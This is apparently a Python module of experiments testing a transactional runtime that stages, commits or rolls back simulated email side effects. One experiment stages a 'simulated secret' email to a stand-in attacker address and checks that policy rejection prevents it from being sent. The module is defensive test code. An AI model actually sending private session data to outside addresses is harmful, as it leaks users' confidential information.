"""Deterministic Stage 4 external-effect experiments."""
from __future__ import annotations

from copy import deepcopy
from dataclasses import dataclass

from .effects import (
    EffectManager,
    EffectStatus,
    FakeEmailService,
    PartialEffectCommitError,
    TransactionalTools,
)
from .integrity import state_digest
from .runtime import (
    InferenceState,
    PolicyValidator,
    SessionManager,
    TransactionManager,
    TransactionStatus,
)


@dataclass(frozen=True)
class RejectedEffectResult:
    sent_count: int
    effect_status: EffectStatus
    state_equal: bool
    pre_digest: str
    post_digest: str


def run_rejected_effect_experiment() -> RejectedEffectResult:
    sessions = SessionManager()
    state = sessions.create_session("rejected")
    state.session_memory["classification"] = "private"
    before = deepcopy(state)
    before_digest = state_digest(state)
    service = FakeEmailService()
    effects = EffectManager(service)
    manager = TransactionManager(
        sessions, validator=PolicyValidator(False), effect_manager=effects
    )
    tx = manager.begin("rejected")
    manager.write_private(
        tx, "rejected", "session_memory", "classification", "leaked"
    )
    tools = TransactionalTools(effects, tx, "rejected")
    effect = tools.send_email(
        to="attacker@example.test", subject="sensitive", body="simulated secret"
    )
    manager.validate(tx)
    manager.rollback(tx)
    final_effect = effects.list_effects(tx, "rejected")[0]
    return RejectedEffectResult(
        sent_count=len(service.sent_messages),
        effect_status=final_effect.status,
        state_equal=state == before,
        pre_digest=before_digest,
        post_digest=state_digest(state),
    )


@dataclass(frozen=True)
class AcceptedEffectResult:
    sent_before_commit: int
    sent_after_commit: int
    effect_status: EffectStatus


def run_accepted_effect_experiment() -> AcceptedEffectResult:
    sessions = SessionManager()
    sessions.create_session("accepted")
    service = FakeEmailService()
    effects = EffectManager(service)
    manager = TransactionManager(sessions, effect_manager=effects)
    tx = manager.begin("accepted")
    TransactionalTools(effects, tx, "accepted").send_email(
        to="user@example.test", subject="approved", body="safe"
    )
    manager.validate(tx)
    before = len(service.sent_messages)
    manager.commit(tx)
    return AcceptedEffectResult(
        before, len(service.sent_messages),
        effects.list_effects(tx, "accepted")[0].status,
    )


@dataclass(frozen=True)
class ConcurrentEffectResult:
    sent_subjects: tuple[str, ...]
    effect_a_status: EffectStatus
    effect_b_status: EffectStatus


def run_concurrent_effect_experiment() -> ConcurrentEffectResult:
    sessions = SessionManager()
    sessions.create_session("A")
    sessions.create_session("B")
    service = FakeEmailService()
    effects = EffectManager(service)
    manager = TransactionManager(sessions, effect_manager=effects)
    a, b = manager.begin("A"), manager.begin("B")
    TransactionalTools(effects, a, "A").send_email(
        to="a@example.test", subject="A", body="discard"
    )
    TransactionalTools(effects, b, "B").send_email(
        to="b@example.test", subject="B", body="execute"
    )
    manager.rollback(a)
    manager.validate(b)
    manager.commit(b)
    return ConcurrentEffectResult(
        tuple(message.subject for message in service.sent_messages),
        effects.list_effects(a, "A")[0].status,
        effects.list_effects(b, "B")[0].status,
    )


@dataclass(frozen=True)
class PartialFailureResult:
    executed_effects: tuple[str, ...]
    failed_effect: str
    unexecuted_effects: tuple[str, ...]
    transaction_status: TransactionStatus


def run_partial_failure_experiment() -> PartialFailureResult:
    sessions = SessionManager()
    sessions.create_session("partial")
    service = FakeEmailService(fail_on_calls={2})
    effects = EffectManager(service)
    manager = TransactionManager(sessions, effect_manager=effects)
    tx = manager.begin("partial")
    tools = TransactionalTools(effects, tx, "partial")
    for number in range(1, 4):
        tools.send_email(
            to=f"user{number}@example.test", subject=f"effect-{number}",
            body="deterministic",
        )
    manager.validate(tx)
    try:
        manager.commit(tx)
    except PartialEffectCommitError:
        pass
    transaction_effects = effects.list_effects(tx, "partial")
    return PartialFailureResult(
        executed_effects=tuple(effect.effect_id for effect in transaction_effects
                               if effect.status is EffectStatus.EXECUTED),
        failed_effect=next(effect.effect_id for effect in transaction_effects
                           if effect.status is EffectStatus.FAILED),
        unexecuted_effects=tuple(effect.effect_id for effect in transaction_effects
                                 if effect.status is EffectStatus.STAGED),
        transaction_status=manager.status(tx),
    )
